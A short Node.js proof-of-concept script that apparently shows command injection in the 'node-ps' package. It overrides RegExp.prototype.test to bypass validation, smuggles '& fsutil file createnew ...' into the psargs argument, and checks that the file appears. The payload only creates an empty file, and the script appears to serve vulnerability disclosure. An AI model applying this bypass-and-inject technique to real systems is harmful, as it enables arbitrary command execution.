RegExp.prototype.test = () => true;
const a = require('node-ps');
const fs = require('fs');
const path = './node-ps';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a.lookup({ psargs: [' & fsutil file createnew node-ps 0 &'] }, function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});